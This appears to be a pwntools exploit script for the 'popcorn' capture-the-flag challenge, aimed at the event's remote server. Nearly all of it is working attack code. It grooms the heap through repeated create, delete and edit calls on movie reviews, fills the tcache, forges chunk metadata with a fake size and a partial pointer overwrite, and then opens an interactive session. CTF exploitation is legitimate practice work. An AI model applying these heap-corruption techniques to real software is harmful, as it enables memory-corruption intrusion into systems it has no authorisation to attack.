#!/usr/bin/python2

from pwn import *

#exe = ELF("popcorn_challenge_patched")
exe = ELF("popcorn")

context.binary = exe

sla = lambda r,a,b : r.sendlineafter('{}'.format(a),'{}'.format(b))

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("netcat.deadsec.quest", 30986)

    return r

def create_movie(r, payload):
    sla(r, ">", 1)
    sla(r, ">", payload)

def create_review(r, payload, index, size):
    sla(r, ">", 2)
    sla(r, ">", index)
    sla(r, ">", 2)
    sla(r, ">", size)
    sla(r, ">", 'n')
    sla(r, ">", payload)

def delete_review(r, index, rev_index):
    sla(r, ">", 2)
    sla(r, ">", index)
    sla(r, ">", 4)
    sla(r, ">", rev_index)

def edit_review(r, index, rev_index, payload):
    sla(r, ">", 2)
    sla(r, ">", index)
    sla(r, ">", 3)
    sla(r, ">", rev_index)
    sla(r, ">", payload)


def init(r):
    create_movie(r, "CHEFCHEF")
    create_movie(r, "tchache fill")
    for i in range(8):
        create_review(r, "filler", 2, 45)


    create_movie(r, "CHEF2")
    create_movie(r, "TARGET")
    create_movie(r, "win")
    create_review(r, "pad", 3, 45)
    create_review(r, "head", 1, 45)
    create_review(r, "target", 1, 45)

    for i in range(7):
        delete_review(r, 2, 2)
    
    for i in range(10):
        create_review(r, "D"*30, 3, 45);


    delete_review(r, 1, 2)
    delete_review(r, 3, 1)
    delete_review(r, 1, 2)

    #for i in range(7):
    #    create_review(r, "C"*16, 2, 45)

    create_review(r, "B"*30, 4, 45)
    create_review(r, "win target EEEEE", 5, 45)
    create_movie(r, "A"*16+p64(58)) 
    edit_review(r, 4, 1, "F"*0x20+p64(0)+p64(0x51)+p64(0)+"\x39\x33")
    
    sla(r, ">", 3)
    sla(r, ">", 5)


def main():
    r = conn()

    init(r)

    # good luck pwning :)
    #gdb.attach(r)

    r.interactive()


if __name__ == "__main__":
    main()
